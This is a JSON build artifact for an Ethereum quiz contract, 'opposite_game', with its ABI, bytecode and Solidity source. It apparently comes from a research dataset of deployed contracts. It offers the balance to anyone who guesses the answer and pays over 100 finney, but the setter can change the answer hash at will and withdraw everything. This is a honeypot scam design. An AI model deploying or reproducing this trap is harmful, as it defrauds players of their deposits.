{
  "contractName": "opposite_game",
  "abi": [
    {
      "constant": true,
      "inputs": [],
      "name": "question",
      "outputs": [
        {
          "name": "",
          "type": "string"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_response",
          "type": "string"
        }
      ],
      "name": "Try",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_question",
          "type": "string"
        },
        {
          "name": "_response",
          "type": "string"
        }
      ],
      "name": "start_quiz_game",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "StopGame",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_question",
          "type": "string"
        },
        {
          "name": "_responseHash",
          "type": "bytes32"
        }
      ],
      "name": "NewQuestion",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "newAddress",
          "type": "address"
        }
      ],
      "name": "newQuestioner",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b50610798806100206000396000f300608060405260043610610078576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680633853682c1461007a5780633e3ee859146100a85780633fad9ae01461011257806359988dce146101a2578063b96d64fb146101e5578063f50ab24714610287575b005b6100a6600480360381019080803590602001908201803590602001919091929391929390505050610291565b005b610110600480360381019080803590602001908201803590602001908080601f0160208091040260200160405190810160405280939291908181526020018383808284378201915050505050509192919290803560001916906020019092919050505061036f565b005b34801561011e57600080fd5b506101276103f1565b6040518080602001828103825283818151815260200191508051906020019080838360005b8381101561016757808201518184015260208101905061014c565b50505050905090810190601f1680156101945780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b3480156101ae57600080fd5b506101e3600480360381019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919050505061048f565b005b610285600480360381019080803590602001908201803590602001908080601f0160208091040260200160405190810160405280939291908181526020018383808284378201915050505050509192919290803590602001908201803590602001908080601f016020809104026020016040519081016040528093929190818152602001838380828437820191505050505050919291929050505061052f565b005b61028f61060b565b005b3273ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161415156102cb57600080fd5b81816040518083838082843782019150509250505060405180910390206000191660025460001916148015610307575067016345785d8a000034115b1561036b573373ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f19350505050158015610369573d6000803e3d6000fd5b505b5050565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161415156103cb57600080fd5b81600090805190602001906103e19291906106c7565b5080600281600019169055505050565b60008054600181600116156101000203166002900480601f0160208091040260200160405190810160405280929190818152602001828054600181600116156101000203166002900480156104875780601f1061045c57610100808354040283529160200191610487565b820191906000526020600020905b81548152906001019060200180831161046a57829003601f168201915b505050505081565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161415156104eb57600080fd5b80600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b600060010260025460001916141561060757806040518082805190602001908083835b6020831015156105775780518252602082019150602081019050602083039250610552565b6001836020036101000a03801982511681845116808217855250505050505090500191505060405180910390206002816000191690555081600090805190602001906105c49291906106c7565b5033600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505b5050565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614151561066757600080fd5b3373ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f193505050501580156106c4573d6000803e3d6000fd5b50565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f1061070857805160ff1916838001178555610736565b82800160010185558215610736579182015b8281111561073557825182559160200191906001019061071a565b5b5090506107439190610747565b5090565b61076991905b8082111561076557600081600090555060010161074d565b5090565b905600a165627a7a72305820fb9974f95375e1c25256fce5dd41b870959392cfab4139b81ef9abf2fbac2f940029",
  "source": "\n\ncontract opposite_game\n{\n    function Try(string _response) external payable {\n        require(msg.sender == tx.origin);\n        \n        if(responseHash == keccak256(_response) && msg.value>100 finney)\n        {\n            msg.sender.transfer(this.balance);\n        }\n    }\n    \n    string public question;\n    \n    address questionSender;\n    \n    bytes32 responseHash;\n \n    function start_quiz_game(string _question,string _response) public payable {\n        if(responseHash==0x0) \n        {\n            responseHash = keccak256(_response);\n            question = _question;\n            questionSender = msg.sender;\n        }\n    }\n    \n    function StopGame() public payable onlyQuestionSender {\n       msg.sender.transfer(this.balance);\n    }\n    \n    function NewQuestion(string _question, bytes32 _responseHash) public payable onlyQuestionSender {\n        question = _question;\n        responseHash = _responseHash;\n    }\n    \n    function newQuestioner(address newAddress) public onlyQuestionSender {\n        questionSender = newAddress;\n    }\n    \n    modifier onlyQuestionSender(){\n        require(msg.sender==questionSender);\n        _;\n    }\n    \n    function() public payable{}\n}",
  "sourcePath": "/home/XXX-1/smartrim-experiment/for-rlf/0x467532e79222670a2044c9b168bcbaa33b390ef5/contracts/0x467532e79222670a2044c9b168bcbaa33b390ef5.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.25+commit.59dbf8f1.Emscripten.clang"
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2025-08-14T03:53:05.239Z",
  "networkType": "ethereum",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}